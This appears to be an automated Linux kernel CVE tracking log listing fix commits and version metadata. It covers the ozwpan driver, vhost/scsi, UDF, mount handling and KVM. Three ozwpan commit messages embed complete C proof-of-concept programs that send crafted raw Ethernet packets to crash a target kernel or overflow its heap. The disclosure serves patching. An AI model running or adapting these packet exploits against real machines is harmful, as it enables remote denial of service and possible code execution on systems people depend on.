The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-06-07
CVE: CVE-2015-4001
Break Date: 2012-02-24
Break Commit: ae926051d7eb8f80dba9513db70d2e2fc8385d3a
Break Tag: 3.4
Linus Fix Date: 2015-05-30
Linus Commit: b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-4002:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.45.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9a59029bc218b48eff8b5d4dde5662fd79d3e1a8
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:07:01 2015 +0200

    ozwpan: unchecked signed subtraction leads to DoS
    
    The subtraction here was using a signed integer and did not have any
    bounds checking at all. This commit adds proper bounds checking, made
    easy by use of an unsigned integer. This way, a single packet won't be
    able to remotely trigger a massive loop, locking up the system for a
    considerable amount of time. A PoC follows below, which requires
    ozprotocol.h from this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
    	if (c >= '0' && c <= '9')
    		return c - '0';
    	if (c >= 'a' && c <= 'f')
    		return c - 'a' + 10;
    	if (c >= 'A' && c <= 'F')
    		return c - 'A' + 10;
    	return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
    	int i;
    	for (i = 0; i < 6; i++) {
    		int a, b;
    		a = hex2num(*txt++);
    		if (a < 0)
    			return -1;
    		b = hex2num(*txt++);
    		if (b < 0)
    			return -1;
    		*addr++ = (a << 4) | b;
    		if (i < 5 && *txt++ != ':')
    			return -1;
    	}
    	return 0;
    }
    
    int main(int argc, char *argv[])
    {
    	if (argc < 3) {
    		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
    		return 1;
    	}
    
    	uint8_t dest_mac[6];
    	if (hwaddr_aton(argv[2], dest_mac)) {
    		fprintf(stderr, "Invalid mac address.\n");
    		return 1;
    	}
    
    	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    	if (sockfd < 0) {
    		perror("socket");
    		return 1;
    	}
    
    	struct ifreq if_idx;
    	int interface_index;
    	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
    	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    		perror("SIOCGIFINDEX");
    		return 1;
    	}
    	interface_index = if_idx.ifr_ifindex;
    	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
    		perror("SIOCGIFHWADDR");
    		return 1;
    	}
    	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
    	struct {
    		struct ether_header ether_header;
    		struct oz_hdr oz_hdr;
    		struct oz_elt oz_elt;
    		struct oz_elt_connect_req oz_elt_connect_req;
    		struct oz_elt oz_elt2;
    		struct oz_multiple_fixed oz_multiple_fixed;
    	} __packed packet = {
    		.ether_header = {
    			.ether_type = htons(OZ_ETHERTYPE),
    			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
    			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    		},
    		.oz_hdr = {
    			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
    			.last_pkt_num = 0,
    			.pkt_num = htole32(0)
    		},
    		.oz_elt = {
    			.type = OZ_ELT_CONNECT_REQ,
    			.length = sizeof(struct oz_elt_connect_req)
    		},
    		.oz_elt_connect_req = {
    			.mode = 0,
    			.resv1 = {0},
    			.pd_info = 0,
    			.session_id = 0,
    			.presleep = 0,
    			.ms_isoc_latency = 0,
    			.host_vendor = 0,
    			.keep_alive = 0,
    			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
    			.max_len_div16 = 0,
    			.ms_per_isoc = 0,
    			.up_audio_buf = 0,
    			.ms_per_elt = 0
    		},
    		.oz_elt2 = {
    			.type = OZ_ELT_APP_DATA,
    			.length = sizeof(struct oz_multiple_fixed) - 3
    		},
    		.oz_multiple_fixed = {
    			.app_id = OZ_APPID_USB,
    			.elt_seq_num = 0,
    			.type = OZ_USB_ENDPOINT_DATA,
    			.endpoint = 0,
    			.format = OZ_DATA_F_MULTIPLE_FIXED,
    			.unit_size = 1,
    			.data = {0}
    		}
    	};
    
    	struct sockaddr_ll socket_address = {
    		.sll_ifindex = interface_index,
    		.sll_halen = ETH_ALEN,
    		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    	};
    
    	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
    		perror("sendto");
    		return 1;
    	}
    	return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/staging/ozwpan/ozusbsvc1.c |    7 ++++---
 1 file changed, 4 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-06-07
CVE: CVE-2015-4002
Break Date: 2012-02-24
Break Commit: ae926051d7eb8f80dba9513db70d2e2fc8385d3a
Break Tag: 3.4
Linus Fix Date: 2015-05-30
Linus Commit: 9a59029bc218b48eff8b5d4dde5662fd79d3e1a8
Linus Tag: 4.1
Stable Date: 2015-06-22
Stable Commit: b401148c9de89b542c14b3bf0b31a9c167f97f33
Stable Tag: 3.14.45

CVE-2015-4002:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.45.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit d114b9fe78c8d6fc6e70808c2092aa307c36dc8e
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:06:58 2015 +0200

    ozwpan: Use proper check to prevent heap overflow
    
    Since elt->length is a u8, we can make this variable a u8. Then we can
    do proper bounds checking more easily. Without this, a potentially
    negative value is passed to the memcpy inside oz_hcd_get_desc_cnf,
    resulting in a remotely exploitable heap overflow with network
    supplied data.
    
    This could result in remote code execution. A PoC which obtains DoS
    follows below. It requires the ozprotocol.h file from this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
    	if (c >= '0' && c <= '9')
    		return c - '0';
    	if (c >= 'a' && c <= 'f')
    		return c - 'a' + 10;
    	if (c >= 'A' && c <= 'F')
    		return c - 'A' + 10;
    	return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
    	int i;
    	for (i = 0; i < 6; i++) {
    		int a, b;
    		a = hex2num(*txt++);
    		if (a < 0)
    			return -1;
    		b = hex2num(*txt++);
    		if (b < 0)
    			return -1;
    		*addr++ = (a << 4) | b;
    		if (i < 5 && *txt++ != ':')
    			return -1;
    	}
    	return 0;
    }
    
    int main(int argc, char *argv[])
    {
    	if (argc < 3) {
    		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
    		return 1;
    	}
    
    	uint8_t dest_mac[6];
    	if (hwaddr_aton(argv[2], dest_mac)) {
    		fprintf(stderr, "Invalid mac address.\n");
    		return 1;
    	}
    
    	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    	if (sockfd < 0) {
    		perror("socket");
    		return 1;
    	}
    
    	struct ifreq if_idx;
    	int interface_index;
    	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
    	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    		perror("SIOCGIFINDEX");
    		return 1;
    	}
    	interface_index = if_idx.ifr_ifindex;
    	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
    		perror("SIOCGIFHWADDR");
    		return 1;
    	}
    	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
    	struct {
    		struct ether_header ether_header;
    		struct oz_hdr oz_hdr;
    		struct oz_elt oz_elt;
    		struct oz_elt_connect_req oz_elt_connect_req;
    	} __packed connect_packet = {
    		.ether_header = {
    			.ether_type = htons(OZ_ETHERTYPE),
    			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
    			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    		},
    		.oz_hdr = {
    			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
    			.last_pkt_num = 0,
    			.pkt_num = htole32(0)
    		},
    		.oz_elt = {
    			.type = OZ_ELT_CONNECT_REQ,
    			.length = sizeof(struct oz_elt_connect_req)
    		},
    		.oz_elt_connect_req = {
    			.mode = 0,
    			.resv1 = {0},
    			.pd_info = 0,
    			.session_id = 0,
    			.presleep = 35,
    			.ms_isoc_latency = 0,
    			.host_vendor = 0,
    			.keep_alive = 0,
    			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
    			.max_len_div16 = 0,
    			.ms_per_isoc = 0,
    			.up_audio_buf = 0,
    			.ms_per_elt = 0
    		}
    	};
    
    	struct {
    		struct ether_header ether_header;
    		struct oz_hdr oz_hdr;
    		struct oz_elt oz_elt;
    		struct oz_get_desc_rsp oz_get_desc_rsp;
    	} __packed pwn_packet = {
    		.ether_header = {
    			.ether_type = htons(OZ_ETHERTYPE),
    			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
    			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    		},
    		.oz_hdr = {
    			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
    			.last_pkt_num = 0,
    			.pkt_num = htole32(1)
    		},
    		.oz_elt = {
    			.type = OZ_ELT_APP_DATA,
    			.length = sizeof(struct oz_get_desc_rsp) - 2
    		},
    		.oz_get_desc_rsp = {
    			.app_id = OZ_APPID_USB,
    			.elt_seq_num = 0,
    			.type = OZ_GET_DESC_RSP,
    			.req_id = 0,
    			.offset = htole16(0),
    			.total_size = htole16(0),
    			.rcode = 0,
    			.data = {0}
    		}
    	};
    
    	struct sockaddr_ll socket_address = {
    		.sll_ifindex = interface_index,
    		.sll_halen = ETH_ALEN,
    		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    	};
    
    	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
    		perror("sendto");
    		return 1;
    	}
    	usleep(300000);
    	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
    		perror("sendto");
    		return 1;
    	}
    	return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/staging/ozwpan/ozusbsvc1.c |   13 +++++++++----
 1 file changed, 9 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-06-07
CVE: CVE-2015-4002
Break Date: 2012-02-24
Break Commit: ae926051d7eb8f80dba9513db70d2e2fc8385d3a
Break Tag: 3.4
Linus Fix Date: 2015-05-30
Linus Commit: d114b9fe78c8d6fc6e70808c2092aa307c36dc8e
Linus Tag: 4.1
Stable Date: 2015-06-22
Stable Commit: b440eec2f2729ef6b224030894ea8880f2937371
Stable Tag: 3.14.45

CVE-2015-4003:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.45.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 04bf464a5dfd9ade0dda918e44366c2c61fce80b
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Fri May 29 13:07:00 2015 +0200

    ozwpan: divide-by-zero leading to panic
    
    A network supplied parameter was not checked before division, leading to
    a divide-by-zero. Since this happens in the softirq path, it leads to a
    crash. A PoC follows below, which requires the ozprotocol.h file from
    this module.
    
    =-=-=-=-=-=
    
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <net/if.h>
     #include <netinet/ether.h>
     #include <stdio.h>
     #include <string.h>
     #include <stdlib.h>
     #include <endian.h>
     #include <sys/ioctl.h>
     #include <sys/socket.h>
    
     #define u8 uint8_t
     #define u16 uint16_t
     #define u32 uint32_t
     #define __packed __attribute__((__packed__))
     #include "ozprotocol.h"
    
    static int hex2num(char c)
    {
    	if (c >= '0' && c <= '9')
    		return c - '0';
    	if (c >= 'a' && c <= 'f')
    		return c - 'a' + 10;
    	if (c >= 'A' && c <= 'F')
    		return c - 'A' + 10;
    	return -1;
    }
    static int hwaddr_aton(const char *txt, uint8_t *addr)
    {
    	int i;
    	for (i = 0; i < 6; i++) {
    		int a, b;
    		a = hex2num(*txt++);
    		if (a < 0)
    			return -1;
    		b = hex2num(*txt++);
    		if (b < 0)
    			return -1;
    		*addr++ = (a << 4) | b;
    		if (i < 5 && *txt++ != ':')
    			return -1;
    	}
    	return 0;
    }
    
    int main(int argc, char *argv[])
    {
    	if (argc < 3) {
    		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
    		return 1;
    	}
    
    	uint8_t dest_mac[6];
    	if (hwaddr_aton(argv[2], dest_mac)) {
    		fprintf(stderr, "Invalid mac address.\n");
    		return 1;
    	}
    
    	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
    	if (sockfd < 0) {
    		perror("socket");
    		return 1;
    	}
    
    	struct ifreq if_idx;
    	int interface_index;
    	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
    	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    		perror("SIOCGIFINDEX");
    		return 1;
    	}
    	interface_index = if_idx.ifr_ifindex;
    	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
    		perror("SIOCGIFHWADDR");
    		return 1;
    	}
    	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
    
    	struct {
    		struct ether_header ether_header;
    		struct oz_hdr oz_hdr;
    		struct oz_elt oz_elt;
    		struct oz_elt_connect_req oz_elt_connect_req;
    		struct oz_elt oz_elt2;
    		struct oz_multiple_fixed oz_multiple_fixed;
    	} __packed packet = {
    		.ether_header = {
    			.ether_type = htons(OZ_ETHERTYPE),
    			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
    			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    		},
    		.oz_hdr = {
    			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
    			.last_pkt_num = 0,
    			.pkt_num = htole32(0)
    		},
    		.oz_elt = {
    			.type = OZ_ELT_CONNECT_REQ,
    			.length = sizeof(struct oz_elt_connect_req)
    		},
    		.oz_elt_connect_req = {
    			.mode = 0,
    			.resv1 = {0},
    			.pd_info = 0,
    			.session_id = 0,
    			.presleep = 0,
    			.ms_isoc_latency = 0,
    			.host_vendor = 0,
    			.keep_alive = 0,
    			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
    			.max_len_div16 = 0,
    			.ms_per_isoc = 0,
    			.up_audio_buf = 0,
    			.ms_per_elt = 0
    		},
    		.oz_elt2 = {
    			.type = OZ_ELT_APP_DATA,
    			.length = sizeof(struct oz_multiple_fixed)
    		},
    		.oz_multiple_fixed = {
    			.app_id = OZ_APPID_USB,
    			.elt_seq_num = 0,
    			.type = OZ_USB_ENDPOINT_DATA,
    			.endpoint = 0,
    			.format = OZ_DATA_F_MULTIPLE_FIXED,
    			.unit_size = 0,
    			.data = {0}
    		}
    	};
    
    	struct sockaddr_ll socket_address = {
    		.sll_ifindex = interface_index,
    		.sll_halen = ETH_ALEN,
    		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
    	};
    
    	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
    		perror("sendto");
    		return 1;
    	}
    	return 0;
    }
    
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/staging/ozwpan/ozusbsvc1.c |    5 ++++-
 1 file changed, 4 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-06-07
CVE: CVE-2015-4003
Break Date: 2012-02-24
Break Commit: ae926051d7eb8f80dba9513db70d2e2fc8385d3a
Break Tag: 3.4
Linus Fix Date: 2015-05-30
Linus Commit: 04bf464a5dfd9ade0dda918e44366c2c61fce80b
Linus Tag: 4.1
Stable Date: 2015-06-22
Stable Commit: c352bbe0f4b610a9f9f1327a63fd558a840afc85
Stable Tag: 3.14.45

CVE-2015-4004:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a73e99cb67e7438e5ab0c524ae63a8a27616c839
Author: Jason A. Donenfeld <Jason@zx2c4.com>
Date:   Mon Aug 10 17:49:51 2015 +0200

    staging: ozwpan: Remove from tree
    
    Ozwpan is completely unmaintained and potentially a security problem. As
    this is a staging driver, it should be removed, since it has been
    abandoned.
    
    Cc: Shigekatsu Tateno <shigekatsu.tateno@atmel.com>
    Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 MAINTAINERS                            |    5 -
 drivers/staging/Kconfig                |    2 -
 drivers/staging/Makefile               |    1 -
 drivers/staging/ozwpan/Kconfig         |    9 -
 drivers/staging/ozwpan/Makefile        |   16 -
 drivers/staging/ozwpan/README          |   25 -
 drivers/staging/ozwpan/TODO            |   14 -
 drivers/staging/ozwpan/ozappif.h       |   36 -
 drivers/staging/ozwpan/ozcdev.c        |  554 --------
 drivers/staging/ozwpan/ozcdev.h        |   17 -
 drivers/staging/ozwpan/ozdbg.h         |   54 -
 drivers/staging/ozwpan/ozeltbuf.c      |  252 ----
 drivers/staging/ozwpan/ozeltbuf.h      |   65 -
 drivers/staging/ozwpan/ozhcd.c         | 2301 --------------------------------
 drivers/staging/ozwpan/ozhcd.h         |   15 -
 drivers/staging/ozwpan/ozmain.c        |   71 -
 drivers/staging/ozwpan/ozpd.c          |  886 ------------
 drivers/staging/ozwpan/ozpd.h          |  134 --
 drivers/staging/ozwpan/ozproto.c       |  813 -----------
 drivers/staging/ozwpan/ozproto.h       |   62 -
 drivers/staging/ozwpan/ozprotocol.h    |  375 ------
 drivers/staging/ozwpan/ozurbparanoia.c |   54 -
 drivers/staging/ozwpan/ozurbparanoia.h |   19 -
 drivers/staging/ozwpan/ozusbif.h       |   43 -
 drivers/staging/ozwpan/ozusbsvc.c      |  263 ----
 drivers/staging/ozwpan/ozusbsvc.h      |   32 -
 drivers/staging/ozwpan/ozusbsvc1.c     |  472 -------
 27 files changed, 6590 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-06-07
CVE: CVE-2015-4004
Break Date: 2012-02-24
Break Commit: ae926051d7eb8f80dba9513db70d2e2fc8385d3a
Break Tag: 3.4
Linus Fix Date: 2015-08-10
Linus Commit: a73e99cb67e7438e5ab0c524ae63a8a27616c839
Linus Tag: 4.3
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-4036:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.57.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 59c816c1f24df0204e01851431d3bab3eb76719c
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Feb 5 10:37:33 2015 +0300

    vhost/scsi: potential memory corruption
    
    This code in vhost_scsi_make_tpg() is confusing because we limit "tpgt"
    to UINT_MAX but the data type of "tpg->tport_tpgt" and that is a u16.
    
    I looked at the context and it turns out that in
    vhost_scsi_set_endpoint(), "tpg->tport_tpgt" is used as an offset into
    the vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements so
    anything higher than 255 then it is invalid.  I have made that the limit
    now.
    
    In vhost_scsi_send_evt() we mask away values higher than 255, but now
    that the limit has changed, we don't need the mask.
    
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>

 drivers/vhost/scsi.c |    6 +++---
 1 file changed, 3 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-31
CVE: CVE-2015-4036
Break Date: 2012-07-29
Break Commit: 057cbf49a1f08297877e46c82f707b1bfea806a8
Break Tag: 3.6
Linus Fix Date: 2015-02-05
Linus Commit: 59c816c1f24df0204e01851431d3bab3eb76719c
Linus Tag: 4.0
Stable Date: 2015-11-09
Stable Commit: 6c6216a01ac816230882c35de819e36ad1c40b0d
Stable Tag: 3.14.57

CVE-2015-4167:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.54.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 23b133bdc452aa441fcb9b82cbf6dd05cfd342d0
Author: Jan Kara <jack@suse.cz>
Date:   Wed Jan 7 13:49:08 2015 +0100

    udf: Check length of extended attributes and allocation descriptors
    
    Check length of extended attributes and allocation descriptors when
    loading inodes from disk. Otherwise corrupted filesystems could confuse
    the code and make the kernel oops.
    
    Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no>
    CC: stable@vger.kernel.org
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/inode.c |    9 +++++++++
 1 file changed, 9 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-08-05
CVE: CVE-2015-4167
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-01-07
Linus Commit: 23b133bdc452aa441fcb9b82cbf6dd05cfd342d0
Linus Tag: 4.0
Stable Date: 2015-10-01
Stable Commit: 34820fc89c5e635b7381e4060931ca30a63d110a
Stable Tag: 3.14.54

CVE-2014-9717:
CVE-2015-4176:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit e0c9c0afd2fc958ffa34b697972721d81df8a56f
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Wed Apr 1 18:30:06 2015 -0500

    mnt: Update detach_mounts to leave mounts connected
    
    Now that it is possible to lazily unmount an entire mount tree and
    leave the individual mounts connected to each other add a new flag
    UMOUNT_CONNECTED to umount_tree to force this behavior and use
    this flag in detach_mounts.
    
    This closes a bug where the deletion of a file or directory could
    trigger an unmount and reveal data under a mount point.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c |    8 ++++++--
 1 file changed, 6 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2014-9717
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-04-09
Linus Commit: e0c9c0afd2fc958ffa34b697972721d81df8a56f
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-4177:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit cd4a40174b71acd021877341684d8bb1dc8ea4ae
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Wed Jan 7 14:28:26 2015 -0600

    mnt: Fail collect_mounts when applied to unmounted mounts
    
    The only users of collect_mounts are in audit_tree.c
    
    In audit_trim_trees and audit_add_tree_rule the path passed into
    collect_mounts is generated from kern_path passed an audit_tree
    pathname which is guaranteed to be an absolute path.   In those cases
    collect_mounts is obviously intended to work on mounted paths and
    if a race results in paths that are unmounted when collect_mounts
    it is reasonable to fail early.
    
    The paths passed into audit_tag_tree don't have the absolute path
    check.  But are used to play with fsnotify and otherwise interact with
    the audit_trees, so again operating only on mounted paths appears
    reasonable.
    
    Avoid having to worry about what happens when we try and audit
    unmounted filesystems by restricting collect_mounts to mounts
    that appear in the mount tree.
    
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c |    7 +++++--
 1 file changed, 5 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-4177
Break Date: 2015-04-09
Break Commit: ce07d891a0891d3c0d0c2d73d577490486b809e1
Break Tag: 4.1
Linus Fix Date: 2015-04-09
Linus Commit: cd4a40174b71acd021877341684d8bb1dc8ea4ae
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-4178:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 820f9f147dcce2602eefd9b575bbbd9ea14f0953
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Thu Apr 2 16:35:48 2015 -0500

    fs_pin: Allow for the possibility that m_list or s_list go unused.
    
    This is needed to support lazily umounting locked mounts.  Because the
    entire unmounted subtree needs to stay together until there are no
    users with references to any part of the subtree.
    
    To support this guarantee that the fs_pin m_list and s_list nodes
    are initialized by initializing them in init_fs_pin allowing
    for the possibility that pin_insert_group does not touch them.
    
    Further use hlist_del_init in pin_remove so that there is
    a hlist_unhashed test before the list we attempt to update
    the previous list item.
    
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/fs_pin.c            |    4 ++--
 include/linux/fs_pin.h |    2 ++
 2 files changed, 4 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-4178
Break Date: 2015-04-09
Break Commit: ce07d891a0891d3c0d0c2d73d577490486b809e1
Break Tag: 4.1
Linus Fix Date: 2015-04-09
Linus Commit: 820f9f147dcce2602eefd9b575bbbd9ea14f0953
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-4692:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.51.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009
Author: Paolo Bonzini <pbonzini@redhat.com>
Date:   Sat May 30 14:31:24 2015 +0200

    kvm: x86: fix kvm_apic_has_events to check for NULL pointer
    
    Malicious (or egregiously buggy) userspace can trigger it, but it
    should never happen in normal operation.
    
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/lapic.h |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-07-27
CVE: CVE-2015-4692
Break Date: 2013-03-13
Break Commit: 66450a21f99636af4fafac2afd33f1a40631bc3a
Break Tag: 3.10
Linus Fix Date: 2015-06-04
Linus Commit: ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009
Linus Tag: 4.2
Stable Date: 2015-08-16
Stable Commit: c76b576d5e9c2966847b08fa634ed395ac8f97b8
Stable Tag: 3.14.51

CVE-2015-4700:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.45.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
